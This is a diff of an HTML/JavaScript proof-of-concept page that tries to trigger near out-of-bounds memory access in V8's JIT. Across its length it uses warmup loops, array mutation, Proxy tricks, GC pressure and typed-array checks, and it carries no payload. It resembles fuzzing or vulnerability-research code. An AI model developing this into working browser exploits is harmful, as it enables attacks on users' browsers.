@@ -1,8 +1,8 @@
 <!doctype html>
 <meta charset="utf-8">
-<title>V8 Aggressive Near-OOB PoC - Aggressive</title>
+<title>V8 Aggressive Near-OOB PoC - Large Typed Array</title>
 
-<h2>V8 Aggressive Near-OOB PoC (Aggressive)</h2>
+<h2>V8 Aggressive Near-OOB PoC - Large Typed Array</h2>
 <pre id="log"></pre>
 
 <script>
@@ -11,32 +11,23 @@ const log = m => {
     console.log(m);
 };
 
-// =======================
-// TARGET FUNCTIONS
-// =======================
+// TARGET FUNCTION
 function vuln(a,i){ return a[i]+1.1; }
-function target(a,i){ return a[i]+1.1; }
 
-// =======================
-// WARMUP JIT
-// =======================
+// WARMUP
 function warmup(){
     let arr = Array.from({length:50}, (_,i)=>i+0.5);
-    for(let j=0;j<200000;j++){
+    for(let j=0;j<150000;j++){
         vuln(arr,j%50);
-        target(arr,j%50);
     }
     return arr;
 }
 
-// =======================
 // AGGRESSIVE MUTATION
-// =======================
 function mutate(arr){
-    // Banyak holes + type confusion
-    for(let i=0;i<15;i++) delete arr[i]; 
+    for(let i=0;i<15;i++) delete arr[i]; // lebih banyak holes
     arr.length = 10;
-    arr[70] = 1.7976931348623157e+308; // max float64
+    arr[80] = 1.7976931348623157e+308; // extreme float64
     arr[2] = {x:1};
     Object.defineProperty(arr,3,{
         get(){ arr.push(Math.random()*1e5); return 1.1; }
@@ -44,43 +35,34 @@ function mutate(arr){
     return arr;
 }
 
-// =======================
-// BREAK ASSUMPTION
-// =======================
 function breakAssumption(a){
     a = new Proxy(a,{
         get(t,p){
             if(p==="length") for(let i=0;i<10;i++) t.push(Math.random()*1e5);
-            if(typeof p==="string" && !isNaN(p) && Math.random()<0.6) t.push(Math.random()*1e5);
+            if(typeof p==="string" && !isNaN(p) && Math.random()<0.5) t.push(Math.random()*1e5);
             return Reflect.get(t,p);
         },
         set(t,p,v){
-            if(Math.random()<0.4) t.length += 5;
+            if(Math.random()<0.2) t.length += 5;
             return Reflect.set(t,p,v);
         }
     });
     return a;
 }
 
-// =======================
-// TYPED ARRAYS
-// =======================
-let buf = new ArrayBuffer(0x8000);
+// TYPED ARRAYS BESAR
+let buf = new ArrayBuffer(0x100000); // 1MB
 let f64 = new Float64Array(buf);
 let u32 = new Uint32Array(buf);
 let u8  = new Uint8Array(buf);
 
-// =======================
 // GC PRESSURE
-// =======================
 function gcPressure(){
     let t=[];
-    for(let i=0;i<300;i++) t.push(new ArrayBuffer(1024*1024));
+    for(let i=0;i<500;i++) t.push(new ArrayBuffer(1024*1024));
 }
 
-// =======================
-// CHECK NEAR-OOB
-// =======================
+// CHECK OOB
 function checkArray(a){
     for(let i=0;i<a.length+200;i++){
         let v = a[i];
@@ -107,9 +89,7 @@ function checkTyped(){
     return false;
 }
 
-// =======================
 // MAIN LOOP
-// =======================
 function run(){
     log("[*] warmup / JIT");
     let base = warmup();
@@ -121,13 +101,13 @@ function run(){
         arr = breakAssumption(arr);
 
         vuln(arr,5);
-        target(arr,4);
 
+        // typed array manipulation
         f64[i % f64.length] = 1.7976931348623157e+308;
         u32[i % u32.length] = 0xffffffff;
         u8[i % u8.length] = 0xff;
 
-        if(i%10===0) gcPressure();
+        if(i%20===0) gcPressure();
 
         if(checkArray(arr)){ log("ARRAY NEAR-OOB BREAK"); return; }
         if(checkTyped()){ log("TYPED ARRAY CORRUPTION"); return; }
